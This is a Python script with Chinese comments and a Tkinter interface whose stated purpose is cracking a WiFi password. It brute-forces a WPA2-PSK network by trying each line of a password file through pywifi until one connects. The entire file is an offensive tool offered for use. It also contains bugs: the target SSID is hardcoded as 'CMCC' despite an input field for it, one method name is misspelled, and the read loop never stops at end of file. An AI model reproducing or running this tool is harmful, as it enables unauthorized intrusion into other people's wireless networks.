#！/E:\python\env\python37\Scripts
# -*- coding:utf-8 -*-
#@Time  :2019/6/1 22:20
#@Author :zbwu103
#@File  ：wifi_text.py
#@功能：通过自己提供的密码本去破解WiFi

import tkinter as tk
from pywifi import const
import pywifi,time,os
from tkinter import messagebox
from multiprocessing import process,Pool
#测试连接
def wificonnect(pwd,wifiname):
    wifi=pywifi.PyWiFi()
    ifaces=wifi.interfaces()[0]
    #如果WiFi是连接的先要断开连接
    ifaces.disconnect()
    time.sleep(1)
    if ifaces.status()==const.IFACE_DISCONNECTED:
        # print('已断开连接')
        #创建WIfi的连接文件
        profile=pywifi.Profile()
        profile.ssid="CMCC"
        #Wifi密码
        profile.key=pwd
        #网卡开放
        profile.auth=const.AUTH_ALG_OPEN
        #添加WIfi的加密算法,无线网卡一般是WPA2PSK
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        #添加加密单元
        profile.cipher=const.CIPHER_TYPE_CCMP
        #删除所有的WIFI文件，方便新的wif连接
        ifaces.remove_all_network_profiles()
        #添加新的连接文件
        temp_profile=ifaces.add_network_profile(profile)
        #连接新的WiFi
        ifaces.connect(temp_profile)
        time.sleep(6)
        if ifaces.status()==const.IFACE_CONNECTED:
            return True
        else:
            return False
    else:
        print('wifi未断开')
# 读取密码本
def  readpassword():
    print("开始破解：")
    wifiname=e1.get()
    path= 'pass.txt'
    with open(path,"r") as f:
        while True:
            try:
                pwd_r=f.readline()
                # print(pwd_r)
                bool=wificonnect(pwd_r,wifiname)
                if bool:
                    print("密码正确",pwd_r)
                    messagebox.showinfo("密码正确.",pwd_r)
                    break
                else:
                    print('密码不正确',pwd_r)
                    text.insert(tk.END,"密码错误:",pwd_r)
                    text.see(tk.END)
                    text.updata()
            except :
                    continue

root=tk.Tk()
root.title("WIFI破解")
root.geometry("500x400+1500+800")
l1=tk.Label(root,text="输入要破解的Wifi名称：",font=('微软雅黑',14))
l1.grid()
e1=tk.Entry(root,text='',font=('微软雅黑',14))
e1.grid(row=0,column=1)
text=tk.Listbox(root,font=("微软雅黑",15),width=40,height=10)
#列表框是跨两列的
text.grid(row=1,columnspan=2)
b1=tk.Button(root,text='开始破解',width=10,height=2,command=readpassword)
b1.grid(row=2,columnspan=2)
root.mainloop()
